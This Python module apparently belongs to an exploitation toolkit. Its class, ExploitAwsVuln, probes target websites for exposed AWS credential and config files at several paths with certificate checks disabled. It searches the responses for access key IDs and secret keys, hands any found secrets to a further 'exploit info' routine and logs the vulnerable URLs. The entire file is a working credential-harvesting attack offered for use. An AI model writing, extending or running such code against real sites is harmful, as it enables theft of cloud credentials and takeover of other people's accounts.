# cython: language_level=3


import threading
import urllib3
import requests


import src.utils.generics.generic as UtilsGenerics
from config.params import ConfigConst
from src.vulnerability.disclosure.common.extract_info_1 import Extact_info_Common_1
from src.vulnerability.services.exploit_info import ExploitInfo

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class ExploitAwsVuln:
    def __init__(self):
        self.AWS_LOCATION = [
            "/.aws/credentials",
            "/.aws/config",
            "/etc/.aws/credentials",
            "/etc/.aws/config",
        ]
        self.KEY_TO_FIND = ["aws_access_key_id", "aws_secret_access_key"]
        self.logger_vuln = UtilsGenerics.setup_logging(
            logger_name=f"{ConfigConst.LoggingConfig.LOGGER_VULN_NAME}",
            log_file=ConfigConst.LoggingConfig.VULN_LOG_FILE_PATH,
        )
        self.file_lock = threading.Lock()
        self.RESULT_VULN = ConfigConst.CommonPathConfig.RESULT_VULN
        self.exploit_info = ExploitInfo()
        self.exploit_info_env = Extact_info_Common_1()

    def run(self, url, session):
        found_aws = []
        success = False
        for aws_loc in self.AWS_LOCATION:
            try:
                response_redi_false = session.get(
                    f"{url}{aws_loc}",
                    timeout=10,
                    allow_redirects=False,
                    verify=False,
                ).text
                if any(keyword in response_redi_false for keyword in self.KEY_TO_FIND):
                    found_aws.append(f"{url}{aws_loc}")
                    success_exploit_info = self.exploit_info.run(
                        self.exploit_info_env.run(
                            response_redi_false, f"{url}{aws_loc}"
                        ),
                        url,
                        f"{url}{aws_loc}",
                        session,
                    )
                    if success_exploit_info:
                        success = True

            except requests.ConnectionError as e:
                break
            except requests.Timeout:
                break
            except requests.RequestException as e:
                if hasattr(e, "response") and e.response:
                    if e.response.is_redirect:
                        continue
                    else:
                        self.logger_vuln.error(
                            f"ExploitAwsVuln - DEBUG error : {e} with url : {url}"
                        )
                        continue
            except Exception as e:
                self.logger_vuln.error(
                    f"ExploitAwsVuln - DEBUG error : {e} with url : {url}"
                )
                continue

        if found_aws:
            for link in found_aws:
                UtilsGenerics.push_result(self, self.RESULT_VULN, f"{link}\n")
        return success
